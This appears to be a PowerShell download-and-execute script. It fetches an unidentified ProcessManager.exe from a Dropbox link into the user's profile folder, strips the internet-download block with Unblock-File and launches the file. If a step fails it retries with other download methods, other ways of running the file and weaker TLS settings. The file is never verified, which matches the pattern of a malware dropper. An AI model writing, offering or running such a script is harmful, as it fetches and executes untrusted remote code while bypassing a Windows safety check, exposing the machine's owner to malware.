# Enable TLS 1.2 for secure download
[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12

# Get the current user's profile path
$userPath = $env:USERPROFILE

# Download URL (updated to direct download link)
$url = "https://www.dropbox.com/scl/fi/5asn30r39w25pbmyi8cr0/ProcessManager.exe?rlkey=q24432rqs87msllnu1jmkfwuy&st=gjcr768i&dl=1"

# Destination file path
$destination = Join-Path -Path $userPath -ChildPath "ProcessManager.exe"

try {
    # Download the file with improved error handling
    Write-Host "Downloading file to $destination..."
    
    # Use WebClient for more reliable downloads
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($url, $destination)
    $webClient.Dispose()

    # Check if file was downloaded successfully
    if (Test-Path $destination) {
        Write-Host "Download completed successfully. File size: $((Get-Item $destination).Length) bytes"
        
        # Wait a moment to ensure file is completely written
        Start-Sleep -Seconds 2
        
        # Unblock file if it was downloaded from internet
        if (Get-Command Unblock-File -ErrorAction SilentlyContinue) {
            try {
                Unblock-File -Path $destination -ErrorAction SilentlyContinue
                Write-Host "File unblocked successfully."
            } catch {
                Write-Host "Note: File could not be unblocked (may require admin rights)"
            }
        }
        
        # Execute the downloaded file
        Write-Host "Starting ProcessManager..."
        
        # Use different methods to start the process
        if ([System.IO.File]::Exists($destination)) {
            # Method 1: Direct execution
            $process = Start-Process -FilePath $destination -PassThru -ErrorAction Stop
            
            # Wait a moment to see if process starts
            Start-Sleep -Seconds 3
            
            if (!$process.HasExited) {
                Write-Host "ProcessManager has been started successfully (PID: $($process.Id))"
            } else {
                Write-Host "ProcessManager started but exited immediately."
                
                # Method 2: Try with PowerShell
                Write-Host "Attempting alternative execution method..."
                & $destination
            }
        } else {
            Write-Host "Error: Downloaded file not found at expected location."
        }
    } else {
        Write-Host "Error: File was not downloaded successfully."
        
        # Alternative download method
        Write-Host "Trying alternative download method..."
        try {
            Invoke-WebRequest -Uri $url -OutFile $destination -UseBasicParsing -ErrorAction Stop
            if (Test-Path $destination) {
                Write-Host "Alternative download successful. Starting application..."
                Start-Process -FilePath $destination
            }
        } catch {
            Write-Host "Alternative download also failed: $($_.Exception.Message)"
        }
    }
}
catch {
    Write-Host "An error occurred: $($_.Exception.Message)"
    Write-Host "Full error details: $($_.Exception.ToString())"
    
    # Check common issues
    if ($_.Exception.Message -like "*SSL/TLS*") {
        Write-Host "Hint: TLS issue detected. Trying with different security protocol..."
        try {
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
            Invoke-WebRequest -Uri $url -OutFile $destination -UseBasicParsing
        } catch {
            Write-Host "TLS workaround also failed."
        }
    }
}

# Final check
if (Test-Path $destination) {
    Write-Host "Operation completed. File is available at: $destination"
} else {
    Write-Host "Operation failed. File was not downloaded."
}
